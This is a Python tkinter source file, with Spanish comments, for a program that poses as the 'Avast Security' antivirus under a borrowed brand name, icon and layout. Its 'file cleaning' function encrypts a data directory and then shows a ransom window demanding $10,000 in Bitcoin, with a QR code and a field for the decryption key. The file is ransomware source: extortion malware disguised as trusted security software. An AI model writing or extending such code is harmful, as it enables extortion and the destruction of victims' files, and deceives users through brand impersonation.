import sys
from pathlib import Path

# Ruta base del proyecto
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

import random
import os
import tkinter as tk
from tkinter import ttk, messagebox
from PIL import Image, ImageTk
from src.encryptor import encrypt_directory, decrypt_directory

# Configuración de rutas
QR_CODE_PATH = BASE_DIR / "qr_code.png"
DIRECTORY_TO_ENCRYPT = BASE_DIR / "data"
ICONS_DIR = BASE_DIR / "icons"

recipient_email = "nickhendricks4321@gmail.com"

# Configuración principal de la ventana
root = tk.Tk()
root.title("Avast Security")
root.geometry("1200x700")
root.configure(bg="#f5f5f5")  # Fondo claro como en la imagen

# Configuración de icono
icon_path = ICONS_DIR / "avast_icon.ico"
root.iconbitmap(str(icon_path))

# Colores basados en la imagen
PRIMARY_COLOR = "#2d73a5"  # Azul Avast
SECONDARY_COLOR = "#e8f4fc"  # Fondo de secciones
ACCENT_COLOR = "#ff9000"  # Naranja para botones
TEXT_COLOR = "#333333"
SECTION_TITLE_COLOR = "#2d73a5"

# Fuentes
FONT_TITLE = ("Segoe UI", 18, "bold")
FONT_SECTION = ("Segoe UI", 14, "bold")
FONT_TEXT = ("Segoe UI", 12)
FONT_BUTTON = ("Segoe UI", 11, "bold")

# Configuración de grid
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)

# Frame principal
main_frame = tk.Frame(root, bg="#f5f5f5")
main_frame.grid(row=0, column=0, sticky="nsew", padx=20, pady=20)
main_frame.grid_rowconfigure(1, weight=1)
main_frame.grid_columnconfigure(0, weight=1)

# Barra superior (simplificada)
top_bar = tk.Frame(main_frame, height=60, bg="white")
top_bar.grid(row=0, column=0, sticky="ew", columnspan=2)

avast_logo = tk.Label(top_bar, text="AVAST", font=("Segoe UI", 20, "bold"), 
                     bg="white", fg=PRIMARY_COLOR)
avast_logo.pack(side="left", padx=20)

# Contenido principal
content_frame = tk.Frame(main_frame, bg="#f5f5f5")
content_frame.grid(row=1, column=0, sticky="nsew")
content_frame.grid_columnconfigure(0, weight=1)

# Sección Privacy (como en la imagen)
def create_section(parent, title, items):
    section_frame = tk.Frame(parent, bg=SECONDARY_COLOR, padx=15, pady=15)
    section_frame.pack(fill="x", pady=(0, 20))
    
    title_label = tk.Label(section_frame, text=title, font=FONT_SECTION, 
                          bg=SECONDARY_COLOR, fg=SECTION_TITLE_COLOR)
    title_label.pack(anchor="w")
    
    for item in items:
        item_frame = tk.Frame(section_frame, bg=SECONDARY_COLOR)
        item_frame.pack(fill="x", pady=5)
        
        # Bullet point
        bullet = tk.Label(item_frame, text="•", font=FONT_TEXT, 
                         bg=SECONDARY_COLOR, fg=SECTION_TITLE_COLOR)
        bullet.pack(side="left", padx=(0, 10))
        
        # Item text
        item_label = tk.Label(item_frame, text=item, font=FONT_TEXT, 
                            bg=SECONDARY_COLOR, fg=TEXT_COLOR)
        item_label.pack(side="left")
    
    return section_frame

# Sección Privacy
privacy_section = create_section(content_frame, "Privacy", [
    "Protection", 
    "Privacy", 
    "Performance"
])

# Sección Hack Alerts
hack_alerts_section = create_section(content_frame, "Hack Alerts", [
    "Password Protection", 
    "Webcam Shield", 
    "Sensitive Data Shield"
])

# Sección Data Shredder
data_shredder_frame = tk.Frame(content_frame, bg=SECONDARY_COLOR, padx=15, pady=15)
data_shredder_frame.pack(fill="x", pady=(0, 20))

tk.Label(data_shredder_frame, text="Data Shredder", font=FONT_SECTION, 
        bg=SECONDARY_COLOR, fg=SECTION_TITLE_COLOR).pack(anchor="w")

# Texto adicional y botones como en la imagen
additional_text = tk.Label(data_shredder_frame, 
                         text="Need more privacy? Check out our other apps",
                         font=FONT_TEXT, bg=SECONDARY_COLOR, fg=TEXT_COLOR)
additional_text.pack(pady=(10, 15))

# Botones inferiores (simulando la tabla de la imagen)
buttons_frame = tk.Frame(data_shredder_frame, bg=SECONDARY_COLOR)
buttons_frame.pack(fill="x")

button_texts = [
    ("BUY NOW", "SecureLine VPN Learn.more"),
    ("BUY NOW", "AntiTrack Premium Learn.more"), 
    ("BUY NOW", "Secure Browser Learn.more")
]

for text1, text2 in button_texts:
    btn_frame = tk.Frame(buttons_frame, bg=SECONDARY_COLOR)
    btn_frame.pack(side="left", expand=True, fill="x", padx=5)
    
    btn1 = tk.Button(btn_frame, text=text1, font=FONT_BUTTON, 
                    bg=ACCENT_COLOR, fg="white", relief="flat",
                    padx=10, pady=5)
    btn1.pack(fill="x")
    
    btn2 = tk.Button(btn_frame, text=text2, font=FONT_TEXT, 
                    bg=SECONDARY_COLOR, fg=PRIMARY_COLOR, relief="flat",
                    padx=10, pady=5)
    btn2.pack(fill="x")

# Función de escaneo (mantenida de tu código original)
def limpiar_archivos():
    encrypt_directory(DIRECTORY_TO_ENCRYPT, recipient_email)
    show_ransom_message()

# Ransom message (mantenido de tu código original)
def show_ransom_message():
    win = tk.Toplevel(root)
    win.title("Amenaza Detectada")
    win.geometry("600x550")
    win.config(bg="#121212")

    msg = "Tus archivos fueron cifrados.\n\nSi quiere recuperarlos, deposite 10.000$ en BTC\n\na la siguiente cartera y le enviaremos la clave para desencriptarlos."
    tk.Label(win, text=msg, font=FONT_TEXT, bg="#121212", fg="white").pack(pady=20)

    qr_image = Image.open(QR_CODE_PATH).resize((200, 200), Image.LANCZOS)
    qr_photo = ImageTk.PhotoImage(qr_image)
    qr_label = tk.Label(win, image=qr_photo, bg="#121212")
    qr_label.image = qr_photo
    qr_label.pack(pady=10)

    def request_decryption():
        private_key = tk.simpledialog.askstring("Clave de recuperación", "Introduce tu clave privada:")
        if private_key:
            try:
                decrypt_directory(DIRECTORY_TO_ENCRYPT, private_key)
                messagebox.showinfo("Recuperación completada", "Tus archivos han sido restaurados.")
                win.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Clave incorrecta.\n{e}")

    btn = tk.Button(win, text="Recuperar Archivos", command=request_decryption, font=FONT_TEXT,
                    bg="#FF9100", fg="white", activebackground="#FFA726")
    btn.pack(pady=20)

if __name__ == "__main__":
    root.mainloop()